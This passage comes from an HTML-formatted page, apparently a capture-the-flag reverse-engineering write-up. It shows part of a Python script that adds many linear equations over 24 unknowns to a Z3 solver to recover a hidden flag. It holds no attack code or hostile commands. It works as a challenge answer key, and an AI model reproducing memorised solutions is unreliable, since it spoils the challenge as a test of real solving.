class="number">981</span> * x15 + <span class="number">917</span> * x14 + <span class="number">465</span> * x13 + <span class="number">706</span> * x12 + <span class="number">480</span> * x11 + <span class="number">699</span> * x10 + <span class="number">817</span> * x9 + <span class="number">617</span> * x8 + <span class="number">148</span> * x7 + <span class="number">653</span> * x6 + <span class="number">299</span> * x5 + <span class="number">736</span> * x4 + <span class="number">530</span> * x3 + <span class="number">867</span> * x2 + <span class="number">283</span> * x1 + <span class="number">248</span> * x0 + <span class="number">575</span> * x23 == <span class="number">1281865</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">924</span> * x22 + <span class="number">494</span> * x21 + <span class="number">663</span> * x20 + <span class="number">282</span> * x19 + <span class="number">201</span> * x18 + <span class="number">230</span> * x17 + <span class="number">198</span> * x16 + <span class="number">913</span> * x15 + <span class="number">604</span> * x14 + <span class="number">167</span> * x13 + <span class="number">262</span> * x12 + <span class="number">997</span> * x11 + <span class="number">238</span> * x10 + <span class="number">478</span> * x9 + <span class="number">734</span> * x8 + <span class="number">878</span> * x7 + <span class="number">225</span> * x6 + <span class="number">231</span> * x5 + <span class="number">508</span> * x4 + <span class="number">660</span> * x3 + <span class="number">846</span> * x2 + <span class="number">400</span> * x1 + <span class="number">407</span> * x0 + <span class="number">718</span> * x23 == <span class="number">1179318</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">148</span> * x22 + <span class="number">815</span> * x21 + <span class="number">569</span> * x20 + <span class="number">139</span> * x19 + <span class="number">142</span> * x18 + <span class="number">798</span> * x17 + <span class="number">157</span> * x16 + <span class="number">871</span> * x15 + <span class="number">272</span> * x14 + <span class="number">473</span> * x13 + <span class="number">574</span> * x12 + <span class="number">357</span> * x11 + <span class="number">653</span> * x10 + <span class="number">678</span> * x9 + <span class="number">792</span> * x8 + <span class="number">328</span> * x7 + <span class="number">125</span> * x6 + <span class="number">803</span> * x5 + <span class="number">910</span> * x4 + <span class="number">210</span> * x3 + <span class="number">318</span> * x2 + <span class="number">130</span> * x1 + <span class="number">240</span> * x0 + <span class="number">723</span> * x23 == <span class="number">1011571</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">731</span> * x22 + <span class="number">156</span> * x21 + <span class="number">542</span> * x20 + <span class="number">859</span> * x19 + <span class="number">811</span> * x18 + <span class="number">715</span> * x17 + <span class="number">135</span> * x16 + <span class="number">658</span> * x15 + <span class="number">122</span> * x14 + <span class="number">970</span> * x13 + <span class="number">678</span> * x12 + <span class="number">920</span> * x11 + <span class="number">820</span> * x10 + <span class="number">421</span> * x9 + <span class="number">392</span> * x8 + <span class="number">197</span> * x7 + <span class="number">720</span> * x6 + <span class="number">622</span> * x5 + <span class="number">683</span> * x2 + <span class="number">514</span> * x1 + <span class="number">782</span> * x0 + <span class="number">716</span> * x3 + <span class="number">257</span> * x4 + <span class="number">945</span> * x23 == <span class="number">1289012</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">157</span> * x22 + <span class="number">380</span> * x21 + <span class="number">141</span> * x20 + <span class="number">650</span> * x19 + <span class="number">989</span> * x18 + <span class="number">870</span> * x17 + <span class="number">247</span> * x16 + <span class="number">732</span> * x15 + <span class="number">171</span> * x14 + <span class="number">854</span> * x13 + <span class="number">316</span> * x12 + <span class="number">752</span> * x11 + <span class="number">369</span> * x10 + <span class="number">616</span> * x9 + <span class="number">873</span> * x8 + <span class="number">691</span> * x7 + <span class="number">565</span> * x6 + <span class="number">515</span> * x5 + <span class="number">973</span> * x4 + <span class="number">694</span> * x3 + <span class="number">785</span> * x2 + <span class="number">451</span> * x1 + <span class="number">978</span> * x0 + <span class="number">167</span> * x23 == <span class="number">1359077</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">395</span> * x22 + <span class="number">161</span> * x21 + <span class="number">302</span> * x20 + <span class="number">376</span> * x19 + <span class="number">393</span> * x18 + <span class="number">424</span> * x17 + <span class="number">641</span> * x16 + <span class="number">670</span> * x15 + <span class="number">888</span> * x14 + <span class="number">293</span> * x13 + <span class="number">921</span> * x12 + <span class="number">503</span> * x11 + <span class="number">525</span> * x10 + <span class="number">200</span> * x9 + <span class="number">955</span> * x8 + <span class="number">866</span> * x7 + <span class="number">597</span> * x6 + <span class="number">345</span> * x5 + <span class="number">900</span> * x4 + <span class="number">638</span> * x3 + <span class="number">107</span> * x2 + <span class="number">938</span> * x1 + <span class="number">642</span> * x0 + <span class="number">983</span> * x23 == <span class="number">1274421</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">590</span> * x22 + <span class="number">146</span> * x21 + <span class="number">452</span> * x20 + <span class="number">448</span> * x19 + <span class="number">212</span> * x18 + <span class="number">133</span> * x17 + <span class="number">907</span> * x16 + <span class="number">230</span> * x15 + <span class="number">456</span> * x14 + <span class="number">578</span> * x13 + <span class="number">751</span> * x12 + <span class="number">936</span> * x11 + <span class="number">265</span> * x10 + <span class="number">701</span> * x9 + <span class="number">932</span> * x8 + <span class="number">377</span> * x7 + <span class="number">463</span> * x6 + <span class="number">956</span> * x5 + <span class="number">937</span> * x4 + <span class="number">858</span> * x1 + <span class="number">609</span> * x0 + <span class="number">847</span> * x2 + <span class="number">192</span> * x3 + <span class="number">217</span> * x23 == <span class="number">1341461</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">654</span> * x22 + <span class="number">828</span> * x21 + <span class="number">474</span> * x20 + <span class="number">603</span> * x19 + <span class="number">494</span> * x18 + <span class="number">213</span> * x17 + <span class="number">998</span> * x16 + <span class="number">307</span> * x15 + <span class="number">790</span> * x14 + <span class="number">814</span> * x13 + <span class="number">448</span> * x12 + <span class="number">987</span> * x11 + <span class="number">781</span> * x10 + <span class="number">447</span> * x9 + <span class="number">833</span> * x8 + <span class="number">484</span> * x7 + <span class="number">458</span> * x6 + <span class="number">396</span> * x5 + <span class="number">521</span> * x4 + <span class="number">738</span> * x3 + <span class="number">200</span> * x2 + <span class="number">231</span> * x1 + <span class="number">721</span> * x0 + <span class="number">817</span> * x23 == <span class="number">1297964</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">306</span> * x22 + <span class="number">552</span> * x19 + <span class="number">842</span> * x18 + <span class="number">704</span> * x17 + <span class="number">799</span> * x16 + <span class="number">240</span> * x15 + <span class="number">477</span> * x14 + <span class="number">665</span> * x13 + <span class="number">668</span> * x12 + <span class="number">346</span> * x11 + <span class="number">675</span> * x10 + <span class="number">480</span> * x9 + <span class="number">106</span> * x8 + <span class="number">156</span> * x7 + <span class="number">405</span> * x6 + <span class="number">774</span> * x5 + <span class="number">442</span> * x4 + <span class="number">504</span> * x3 + <span class="number">868</span> * x2 + (</span><br><span class="line">                x1 * <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">7</span>))</span><br><span class="line">        + <span class="number">280</span> * x0 + <span class="number">849</span> * x20 + <span class="number">144</span> * x21 + <span class="number">122</span> * x23 == <span class="number">1106164</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">329</span> * x22 + <span class="number">374</span> * x21 + <span class="number">663</span> * x20 + <span class="number">284</span> * x19 + <span class="number">372</span> * x18 + <span class="number">745</span> * x17 + <span class="number">541</span> * x16 + <span class="number">803</span> * x15 + <span class="number">280</span> * x14 + <span class="number">898</span> * x13 + <span class="number">479</span> * x12 + <span class="number">845</span> * x11 + <span class="number">901</span> * x10 + <span class="number">741</span> * x9 + <span class="number">383</span> * x8 + <span class="number">624</span> * x7 + <span class="number">213</span> * x6 + <span class="number">762</span> * x5 + <span class="number">601</span> * x4 + <span class="number">360</span> * x3 + <span class="number">504</span> * x0 + <span class="number">286</span> * x1 + <span class="number">320</span> * x2 + <span class="number">934</span> * x23 == <span class="number">1223627</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">770</span> * x22 + <span class="number">860</span> * x21 + <span class="number">264</span> * x18 + <span class="number">579</span> * x17 + <span class="number">994</span> * x16 + <span class="number">198</span> * x15 + <span class="number">319</span> * x14 + <span class="number">505</span> * x13 + <span class="number">209</span> * x12 + <span class="number">119</span> * x11 + <span class="number">851</span> * x10 + <span class="number">124</span> * x9 + <span class="number">124</span> * x8 + <span class="number">726</span> * x7 + <span class="number">484</span> * x6 + <span class="number">282</span> * x5 + <span class="number">438</span> * x4 + <span class="number">762</span> * x3 + <span class="number">395</span> * x2 + <span class="number">584</span> * x1 + <span class="number">672</span> * x0 + <span class="number">759</span> * x19 + <span class="number">160</span> * x20 + <span class="number">480</span> * x23 == <span class="number">1050611</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">122</span> * x22 + <span class="number">478</span> * x21 + <span class="number">464</span> * x20 + <span class="number">651</span> * x19 + <span class="number">137</span> * x18 + <span class="number">421</span> * x17 + <span class="number">672</span> * x16 + <span class="number">115</span> * x15 + <span class="number">939</span> * x14 + <span class="number">308</span> * x13 + <span class="number">536</span> * x12 + <span class="number">198</span> * x11 + <span class="number">732</span> * x10 + <span class="number">883</span> * x9 + <span class="number">494</span> * x8 + <span class="number">966</span> * x7 + <span class="number">187</span> * x6 + <span class="number">262</span> * x5 + <span class="number">212</span> * x4 + <span class="number">621</span> * x3 + <span class="number">936</span> * x2 + <span class="number">108</span> * x1 + <span class="number">393</span> * x0 + <span class="number">290</span> * x23 == <span class="number">1052881</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">547</span> * x22 + <span class="number">984</span> * x21 + <span class="number">403</span> * x20 + <span class="number">946</span> * x19 + <span class="number">224</span> * x18 + <span class="number">943</span> * x17 + <span class="number">226</span> * x16 + <span class="number">296</span> * x11 + <span class="number">611</span> * x10 + <span class="number">181</span> * x9 + <span class="number">911</span> * x8 + <span class="number">712</span> * x7 + <span class="number">482</span> * x6 + <span class="number">901</span> * x5 + <span class="number">817</span> * x4 + <span class="number">383</span> * x1 + <span class="number">369</span> * x0 + <span class="number">598</span> * x2 + <span class="number">127</span> * x3 + <span class="number">425</span> * x12 + <span class="number">160</span> * x13 + <span class="number">782</span> * x14 + <span class="number">320</span> * x15 + <span class="number">559</span> * x23 == <span class="number">1156505</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">118</span> * x22 + <span class="number">180</span> * x21 + <span class="number">881</span> * x20 + <span class="number">901</span> * x19 + <span class="number">962</span> * x18 + <span class="number">988</span> * x17 + <span class="number">178</span> * x16 + <span class="number">978</span> * x15 + <span class="number">456</span> * x14 + <span class="number">275</span> * x13 + <span class="number">756</span> * x12 + <span class="number">360</span> * x11 + <span class="number">241</span> * x10 + <span class="number">796</span> * x9 + <span class="number">914</span> * x8 + <span class="number">482</span> * x7 + <span class="number">968</span> * x6 + <span class="number">603</span> * x5 + <span class="number">940</span> * x4 + <span class="number">569</span> * x3 + <span class="number">953</span> * x0 + <span class="number">461</span> * x1 + <span class="number">320</span> * x2 + <span class="number">531</span> * x23 == <span class="number">1386320</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">683</span> * x22 + <span class="number">871</span> * x19 + <span class="number">367</span> * x18 + <span class="number">112</span> * x17 + <span class="number">675</span> * x16 + <span class="number">157</span> * x15 + <span class="number">974</span> * x14 + <span class="number">226</span> * x11 + <span class="number">727</span> * x10 + <span class="number">132</span> * x9 + <span class="number">609</span> * x8 + <span class="number">652</span> * x7 + <span class="number">863</span> * x6 + <span class="number">125</span> * x5 + <span class="number">770</span> * x4 + <span class="number">262</span> * x3 + <span class="number">451</span> * x2 + <span class="number">954</span> * x1 + <span class="number">414</span> * x0 + <span class="number">315</span> * x12 + <span class="number">255</span> * x13 + <span class="number">628</span> * x20 + <span class="number">640</span> * x21 + <span class="number">169</span> * x23 == <span class="number">1114006</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">708</span> * x22 + <span class="number">474</span> * x21 + <span class="number">867</span> * x20 + <span class="number">480</span> * x19 + <span class="number">845</span> * x18 + <span class="number">121</span> * x17 + <span class="number">331</span> * x16 + <span class="number">914</span> * x15 + <span class="number">988</span> * x14 + <span class="number">259</span> * x13 + <span class="number">375</span> * x12 + <span class="number">832</span> * x9 + <span class="number">114</span> * x8 + <span class="number">767</span> * x7 + <span class="number">526</span> * x6 + (</span><br><span class="line">                x5 * <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">9</span>))</span><br><span class="line">        + <span class="number">815</span> * x4 + <span class="number">195</span> * x3 + <span class="number">249</span> * x2 + <span class="number">281</span> * x1 + <span class="number">851</span> * x0 + <span class="number">979</span> * x10 + <span class="number">255</span> * x11 + <span class="number">947</span> * x23 == <span class="number">1237822</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">895</span> * x22 + <span class="number">622</span> * x21 + <span class="number">399</span> * x20 + <span class="number">806</span> * x19 + <span class="number">660</span> * x18 + <span class="number">707</span> * x17 + <span class="number">839</span> * x16 + <span class="number">485</span> * x15 + <span class="number">240</span> * x14 + <span class="number">990</span> * x13 + <span class="number">396</span> * x12 + <span class="number">481</span> * x11 + <span class="number">381</span> * x10 + <span class="number">177</span> * x9 + <span class="number">866</span> * x8 + <span class="number">134</span> * x7 + <span class="number">208</span> * x6 + <span class="number">362</span> * x5 + <span class="number">840</span> * x4 + <span class="number">237</span> * x3 + <span class="number">419</span> * x2 + <span class="number">238</span> * x1 + <span class="number">755</span> * x0 + <span class="number">121</span> * x23 == <span class="number">1193974</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">735</span> * x22 + <span class="number">560</span> * x21 + <span class="number">158</span> * x20 + <span class="number">137</span> * x19 + <span class="number">516</span> * x16 + <span class="number">403</span> * x15 + <span class="number">297</span> * x14 + <span class="number">913</span> * x13 + <span class="number">767</span> * x12 + <span class="number">504</span> * x11 + <span class="number">858</span> * x10 + <span class="number">287</span> * x9 + <span class="number">796</span> * x8 + <span class="number">451</span> * x7 + <span class="number">978</span> * x6 + <span class="number">460</span> * x5 + <span class="number">819</span> * x4 + <span class="number">696</span> * x3 + <span class="number">998</span> * x2 + <span class="number">704</span> * x1 + <span class="number">580</span> * x0 + <span class="number">644</span> * x17 + <span class="number">384</span> * x18 + <span class="number">112</span> * x23 == <span class="number">1304537</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">555</span> * x22 + <span class="number">704</span> * x21 + <span class="number">981</span> * x20 + <span class="number">997</span> * x19 + <span class="number">436</span> * x18 + <span class="number">173</span> * x17 + <span class="number">920</span> * x16 + <span class="number">645</span> * x15 + <span class="number">589</span> * x14 + <span class="number">613</span> * x13 + <span class="number">734</span> * x12 + <span class="number">688</span> * x11 + <span class="number">551</span> * x10 + <span class="number">172</span> * x9 + <span class="number">442</span> * x8 + <span class="number">830</span> * x7 + <span class="number">878</span> * x6 + <span class="number">307</span> * x5 + <span class="number">227</span> * x4 + <span class="number">332</span> * x3 + <span class="number">537</span> * x2 + <span class="number">104</span> * x1 + <span class="number">994</span> * x0 + <span class="number">775</span> * x23 == <span class="number">1264632</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">379</span> * x22 + <span class="number">918</span> * x21 + <span class="number">613</span> * x20 + <span class="number">827</span> * x19 + <span class="number">472</span> * x18 + <span class="number">719</span> * x17 + <span class="number">821</span> * x16 + <span class="number">370</span> * x15 + <span class="number">452</span> * x14 + <span class="number">435</span> * x13 + <span class="number">901</span> * x12 + <span class="number">171</span> * x11 + <span class="number">221</span> * x10 + <span class="number">666</span> * x9 + <span class="number">477</span> * x8 + <span class="number">398</span> * x7 + <span class="number">371</span> * x6 + <span class="number">392</span> * x5 + <span class="number">958</span> * x4 + <span class="number">561</span> * x3 + <span class="number">509</span> * x2 + <span class="number">282</span> * x1 + <span class="number">104</span> * x0 + <span class="number">590</span> * x23 == <span class="number">1157687</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(<span class="number">322</span> * x22 + <span class="number">750</span> * x21 + <span class="number">261</span> * x20 + <span class="number">486</span> * x19 + (x18 * <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">9</span>))</span><br><span class="line">               + <span class="number">941</span> * x17 + <span class="number">745</span> * x16 + <span class="number">313</span> * x13 + <span class="number">283</span> * x12 + <span class="number">619</span> * x11 + <span class="number">315</span> * x10 + <span class="number">705</span> * x9 + <span class="number">450</span> * x8 + <span class="number">772</span> * x7 + <span class="number">307</span> * x6 + <span class="number">623</span> * x5 + <span class="number">797</span> * x4 + <span class="number">674</span> * x3 + <span class="number">601</span> * x2 + <span class="number">621</span> * x1 + <span class="number">552</span> * x0 + <span class="number">319</span> * x14 + <span class="number">255</span> * x15 + <span class="number">242</span> * x23 == <span class="number">1212043</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">737</span> * x22 + <span class="number">589</span> * x21 + <span class="number">559</span> * x20 + <span class="number">654</span> * x19 + <span class="number">468</span> * x18 + <span class="number">312</span> * x17 + <span class="number">441</span> * x16 + <span class="number">499</span> * x15 + <span class="number">817</span> * x14 + <span class="number">101</span> * x13 + <span class="number">343</span> * x12 + <span class="number">229</span> * x11 + <span class="number">275</span> * x10 + <span class="number">837</span> * x9 + <span class="number">874</span> * x8 + <span class="number">761</span> * x7 + <span class="number">756</span> * x6 + <span class="number">375</span> * x5 + <span class="number">135</span> * x4 + <span class="number">345</span> * x3 + <span class="number">899</span> * x2 + <span class="number">984</span> * x1 + <span class="number">263</span> * x0 + <span class="number">114</span> * x23 == <span class="number">1188462</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">911</span> * x22 + <span class="number">124</span> * x21 + <span class="number">445</span> * x20 + <span class="number">177</span> * x19 + <span class="number">520</span> * x18 + <span class="number">620</span> * x17 + <span class="number">122</span> * x16 + <span class="number">731</span> * x15 + <span class="number">222</span> * x14 + <span class="number">571</span> * x13 + <span class="number">494</span> * x12 + <span class="number">806</span> * x11 + <span class="number">990</span> * x10 + <span class="number">783</span> * x9 + <span class="number">202</span> * x8 + <span class="number">111</span> * x7 + <span class="number">589</span> * x6 + <span class="number">968</span> * x5 + <span class="number">878</span> * x4 + <span class="number">758</span> * x3 + <span class="number">789</span> * x2 + <span class="number">684</span> * x1 + <span class="number">961</span> * x0 + <span class="number">550</span> * x23 == <span class="number">1340704</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">125</span> * x22 + <span class="number">108</span> * x21 + <span class="number">828</span> * x20 + <span class="number">616</span> * x19 + <span class="number">989</span> * x18 + <span class="number">598</span> * x17 + <span class="number">993</span> * x16 + <span class="number">313</span> * x15 + <span class="number">335</span> * x14 + <span class="number">386</span> * x13 + <span class="number">591</span> * x12 + <span class="number">508</span> * x11 + <span class="number">270</span> * x10 + <span class="number">537</span> * x9 + <span class="number">465</span> * x8 + <span class="number">596</span> * x7 + <span class="number">876</span> * x6 + <span class="number">881</span> * x5 + <span class="number">121</span> * x4 + <span class="number">536</span> * x3 + <span class="number">101</span> * x2 + <span class="number">514</span> * x1 + <span class="number">900</span> * x0 + <span class="number">188</span> * x23 == <span class="number">1188045</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">509</span> * x22 + <span class="number">971</span> * x21 + <span class="number">442</span> * x20 + <span class="number">665</span> * x19 + <span class="number">721</span> * x18 + <span class="number">612</span> * x17 + <span class="number">132</span> * x16 + <span class="number">315</span> * x15 + <span class="number">746</span> * x14 + <span class="number">965</span> * x13 + <span class="number">989</span> * x12 + <span class="number">540</span> * x11 + <span class="number">299</span> * x10 + <span class="number">549</span> * x9 + <span class="number">632</span> * x8 + <span class="number">846</span> * x7 + <span class="number">933</span> * x6 + <span class="number">610</span> * x5 + <span class="number">434</span> * x4 + <span class="number">627</span> * x3 + <span class="number">766</span> * x2 + <span class="number">776</span> * x1 + <span class="number">931</span> * x0 + <span class="number">776</span> * x23 == <span class="number">1424726</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">991</span> * x22 + <span class="number">591</span> * x21 + <span class="number">966</span> * x20 + <span class="number">290</span> * x19 + <span class="number">145</span> * x18 + <span class="number">839</span> * x17 + <span class="number">143</span> * x16 + <span class="number">428</span> * x15 + <span class="number">971</span> * x14 + <span class="number">239</span> * x13 + <span class="number">428</span> * x12 + <span class="number">939</span> * x11 + <span class="number">853</span> * x10 + <span class="number">319</span> * x9 + <span class="number">184</span> * x8 + <span class="number">833</span> * x5 + <span class="number">983</span> * x4 + <span class="number">306</span> * x3 + <span class="number">880</span> * x2 + <span class="number">644</span> * x1 + <span class="number">197</span> * x0 + <span class="number">610</span> * x6 + <span class="number">144</span> * x7 + <span class="number">968</span> * x23 == <span class="number">1253549</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">379</span> * x22 + <span class="number">396</span> * x19 + <span class="number">669</span> * x18 + <span class="number">218</span> * x17 + <span class="number">467</span> * x16 + <span class="number">109</span> * x15 + <span class="number">353</span> * x14 + <span class="number">139</span> * x13 + <span class="number">305</span> * x12 + <span class="number">534</span> * x11 + <span class="number">688</span> * x10 + <span class="number">620</span> * x9 + <span class="number">629</span> * x6 + <span class="number">468</span> * x5 + <span class="number">633</span> * x4 + <span class="number">275</span> * x3 + <span class="number">425</span> * x2 + <span class="number">778</span> * x1 + <span class="number">286</span> * x0 + <span class="number">928</span> * x7 + <span class="number">144</span> * x8 + <span class="number">756</span> * x20 + <span class="number">255</span> * x21 + <span class="number">296</span> * x23 == <span class="number">1018834</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">281</span> * x22 + <span class="number">749</span> * x21 + <span class="number">122</span> * x20 + <span class="number">651</span> * x19 + <span class="number">336</span> * x18 + <span class="number">803</span> * x17 + <span class="number">853</span> * x16 + <span class="number">886</span> * x15 + <span class="number">623</span> * x14 + <span class="number">273</span> * x13 + <span class="number">650</span> * x12 + <span class="number">452</span> * x11 + <span class="number">859</span> * x10 + <span class="number">933</span> * x9 + <span class="number">426</span> * x8 + <span class="number">596</span> * x7 + <span class="number">227</span> * x6 + <span class="number">586</span> * x5 + <span class="number">510</span> * x4 + <span class="number">309</span> * x3 + <span class="number">934</span> * x2 + <span class="number">297</span> * x1 + <span class="number">833</span> * x0 + <span class="number">817</span> * x23 == <span class="number">1282803</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">179</span> * x22 + <span class="number">969</span> * x21 + <span class="number">361</span> * x20 + <span class="number">609</span> * x19 + <span class="number">778</span> * x18 + <span class="number">391</span> * x17 + <span class="number">717</span> * x16 + <span class="number">426</span> * x15 + <span class="number">878</span> * x14 + <span class="number">765</span> * x13 + <span class="number">651</span> * x12 + <span class="number">364</span> * x11 + <span class="number">297</span> * x10 + <span class="number">924</span> * x9 + <span class="number">632</span> * x8 + <span class="number">414</span> * x7 + <span class="number">302</span> * x6 + <span class="number">168</span> * x5 + <span class="number">781</span> * x4 + <span class="number">131</span> * x3 + <span class="number">405</span> * x2 + <span class="number">750</span> * x1 + <span class="number">162</span> * x0 + <span class="number">888</span> * x23 == <span class="number">1168299</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">349</span> * x22 + <span class="number">895</span> * x21 + <span class="number">660</span> * x20 + <span class="number">733</span> * x19 + <span class="number">217</span> * x18 + <span class="number">367</span> * x17 + <span class="number">188</span> * x16 + <span class="number">167</span> * x15 + <span class="number">905</span> * x14 + <span class="number">593</span> * x13 + <span class="number">199</span> * x12 + <span class="number">266</span> * x11 + <span class="number">813</span> * x10 + <span class="number">382</span> * x9 + <span class="number">421</span> * x8 + <span class="number">233</span> * x7 + <span class="number">526</span> * x6 + <span class="number">745</span> * x5 + <span class="number">900</span> * x4 + <span class="number">155</span> * x3 + <span class="number">752</span> * x0 + <span class="number">658</span> * x1 + <span class="number">144</span> * x2 + <span class="number">651</span> * x23 == <span class="number">1045694</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">319</span> * x22 + <span class="number">125</span> * x21 + <span class="number">526</span> * x20 + <span class="number">301</span> * x19 + <span class="number">396</span> * x18 + <span class="number">767</span> * x17 + <span class="number">339</span> * x16 + <span class="number">202</span> * x15 + <span class="number">271</span> * x14 + <span class="number">583</span> * x13 + <span class="number">172</span> * x12 + <span class="number">216</span> * x11 + <span class="number">395</span> * x10 + <span class="number">751</span> * x9 + <span class="number">136</span> * x8 + <span class="number">317</span> * x7 + <span class="number">510</span> * x6 + <span class="number">650</span> * x5 + <span class="number">206</span> * x4 + <span class="number">794</span> * x3 + <span class="number">642</span> * x2 + <span class="number">611</span> * x1 + <span class="number">580</span> * x0 + <span class="number">439</span> * x23 == <span class="number">968455</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">652</span> * x22 + <span class="number">811</span> * x21 + <span class="number">356</span> * x20 + <span class="number">891</span> * x19 + <span class="number">508</span> * x18 + <span class="number">562</span> * x17 + <span class="number">286</span> * x16 + <span class="number">418</span> * x15 + <span class="number">369</span> * x14 + <span class="number">109</span> * x13 + <span class="number">230</span> * x12 + <span class="number">216</span> * x11 + <span class="number">308</span> * x10 + <span class="number">530</span> * x9 + <span class="number">532</span> * x8 + <span class="number">259</span> * x7 + <span class="number">378</span> * x6 + <span class="number">448</span> * x5 + <span class="number">852</span> * x4 + <span class="number">416</span> * x3 + <span class="number">996</span> * x2 + <span class="number">330</span> * x1 + <span class="number">875</span> * x0 + <span class="number">492</span> * x23 == <span class="number">1084093</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">484</span> * x22 + <span class="number">897</span> * x21 + <span class="number">411</span> * x20 + <span class="number">936</span> * x19 + <span class="number">454</span> * x18 + <span class="number">464</span> * x17 + <span class="number">836</span> * x16 + <span class="number">651</span> * x15 + <span class="number">822</span> * x14 + <span class="number">761</span> * x13 + <span class="number">184</span> * x12 + <span class="number">333</span> * x11 + <span class="number">413</span> * x10 + <span class="number">571</span> * x9 + <span class="number">624</span> * x8 + <span class="number">946</span> * x7 + <span class="number">411</span> * x6 + <span class="number">355</span> * x5 + <span class="number">540</span> * x4 + <span class="number">785</span> * x3 + <span class="number">317</span> * x2 + <span class="number">363</span> * x1 + <span class="number">740</span> * x0 + <span class="number">931</span> * x23 == <span class="number">1296107</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">959</span> * x22 + <span class="number">227</span> * x21 + <span class="number">663</span> * x20 + <span class="number">109</span> * x19 + <span class="number">861</span> * x18 + <span class="number">926</span> * x17 + <span class="number">415</span> * x16 + <span class="number">207</span> * x15 + <span class="number">174</span> * x14 + <span class="number">248</span> * x13 + <span class="number">756</span> * x12 + <span class="number">326</span> * x11 + <span class="number">178</span> * x10 + <span class="number">896</span> * x9 + <span class="number">575</span> * x8 + <span class="number">472</span> * x7 + <span class="number">747</span> * x6 + <span class="number">457</span> * x5 + <span class="number">200</span> * x4 + <span class="number">853</span> * x3 + <span class="number">121</span> * x2 + <span class="number">814</span> * x1 + <span class="number">627</span> * x0 + <span class="number">958</span> * x23 == <span class="number">1173526</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">761</span> * x22 + <span class="number">219</span> * x21 + <span class="number">182</span> * x20 + <span class="number">950</span> * x19 + <span class="number">237</span> * x18 + <span class="number">582</span> * x17 + <span class="number">200</span> * x16 + <span class="number">603</span> * x15 + <span class="number">375</span> * x14 + <span class="number">687</span> * x13 + <span class="number">569</span> * x12 + <span class="number">725</span> * x11 + <span class="number">976</span> * x10 + <span class="number">724</span> * x9 + <span class="number">764</span> * x8 + <span class="number">828</span> * x7 + <span class="number">604</span> * x6 + <span class="number">958</span> * x5 + <span class="number">610</span> * x4 + <span class="number">254</span> * x3 + <span class="number">906</span> * x2 + <span class="number">486</span> * x1 + <span class="number">334</span> * x0 + <span class="number">571</span> * x23 == <span class="number">1329741</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(<span class="number">939</span> * x22 + <span class="number">177</span> * x21 + <span class="number">254</span> * x20 + (x19 * <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">9</span>))</span><br><span class="line">               + <span class="number">864</span> * x18 + <span class="number">373</span> * x15 + <span class="number">251</span> * x14 + <span class="number">969</span> * x13 + <span class="number">599</span> * x12 + <span class="number">312</span> * x11 + <span class="number">726</span> * x10 + <span class="number">564</span> * x9 + <span class="number">210</span> * x8 + <span class="number">919</span> * x7 + <span class="number">694</span> * x6 + <span class="number">250</span> * x5 + <span class="number">440</span> * x4 + <span class="number">973</span> * x3 + <span class="number">544</span> * x2 + <span class="number">167</span> * x1 + <span class="number">262</span> * x0 + <span class="number">663</span> * x16 + <span class="number">160</span> * x17 + <span class="number">533</span> * x23 == <span class="number">1165252</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">342</span> * x22 + <span class="number">758</span> * x21 + <span class="number">966</span> * x20 + <span class="number">641</span> * x19 + <span class="number">410</span> * x18 + <span class="number">218</span> * x17 + <span class="number">827</span> * x16 + <span class="number">389</span> * x15 + <span class="number">669</span> * x14 + <span class="number">977</span> * x13 + <span class="number">493</span> * x12 + <span class="number">642</span> * x11 + <span class="number">682</span> * x10 + 